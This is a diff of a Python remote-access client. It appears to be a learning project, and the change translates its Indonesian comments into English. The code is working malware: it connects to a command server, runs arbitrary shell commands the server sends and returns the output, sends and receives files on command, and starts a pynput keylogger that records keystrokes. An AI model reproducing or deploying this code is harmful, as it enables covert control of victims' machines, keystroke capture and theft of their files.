@@ -4,50 +4,55 @@ import threading
 from pathlib import Path
 from pynput.keyboard import Key,Listener
 
-#global allkeys
-allkeys = ''
-keylogging_mode = 0
+allkeys = '' # To store all pressed keys
+keylogging_mode = 0 # Status mode keylogging (0 = off, 1 = on)
 
+# Function that is called when the button is pressed
 def pressed(key):
     global allkeys
     allkeys+=str(key)
 
+# Function called when button is released (not used but defined for Listener)
 def released(key):
     pass
 
+# Function to start keylogging
 def keylog():
     global l
     l = Listener(on_press=pressed, on_release=released)
     l.start()
 
-# Menentukan IP dan Port target/server
+# Configure network to connect the server
 ip_address = '127.0.0.1'
 port_number = 1234
 
-# Membuat objek socket untuk client
-# AF_INET == IPv4
-# SOCK_STREAM == TCP
+# Create a client socket
+# AF_INET == IPv4 & SOCK_STREAM == TCP
 cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Menghubungkan klien ke server dengan menggunakan alamat IP dan nomor port yang telah ditentukan.
+# Connecting to the server
 cs.connect((ip_address, port_number))
 
-# Menyiapkan pesan yang akan dikirim ke server.
+# Send an initial message to the server
 msg = "TEST CLIENT"
-
 cs.send(msg.encode())
+
+# Receive messages from the server
 msg = cs.recv(1024).decode()
 
+# Loop to receive and process messages/commands from the server
 while msg!='quit':
     fullmsg = msg
     msg = list(msg.split(" "))
 
+    # If the command from the server is to download a file
     if msg[0] == 'download':
         filename = msg[1]
         f = open(Path(filename), 'rb')
         contents = f.read()
         cs.send(contents)
         msg = cs.recv(1024).decode()
+    # If the command from the server is to upload a file
     elif msg[0] == 'upload':
         filename = msg[1]
         filesize = int(msg[2])
@@ -57,6 +62,7 @@ while msg!='quit':
         f.close()
         cs.send('Got file'.encode())
         msg = cs.recv(1024).decode()
+    # If the command from the server is to start keylogging
     elif fullmsg == 'keylog on':
         keylogging_mode = 1
         t1 = threading.Thread(target=keylog)
@@ -64,6 +70,7 @@ while msg!='quit':
         msg = "Keylogging has started"
         cs.send(msg.encode())
         msg = cs.recv(1024).decode()
+    # If the command from the server is to stop keylogging
     elif fullmsg == 'keylog off':
         if keylogging_mode == 1:
             l.stop()
@@ -76,6 +83,7 @@ while msg!='quit':
             msg = "Keylogging should be started first"
             cs.send(msg.encode())
             msg = cs.recv(1024).decode()
+    # For all other commands, run the command in the shell and send the output to the server
     else:
         p = subprocess.Popen(
             msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
@@ -85,10 +93,9 @@ while msg!='quit':
             msg = str(output.decode())
         else:
             msg = str(error.decode())
-        # Mengirim pesan ke server. Pesan tersebut harus dikodekan menjadi bytes sebelum dikirim.
         cs.send(msg.encode())
         msg = cs.recv(1024).decode()
         print(msg)
 
-# Menutup objek socket klien setelah pesan berhasil dikirim.
+# Close the connection with the server
 cs.close()
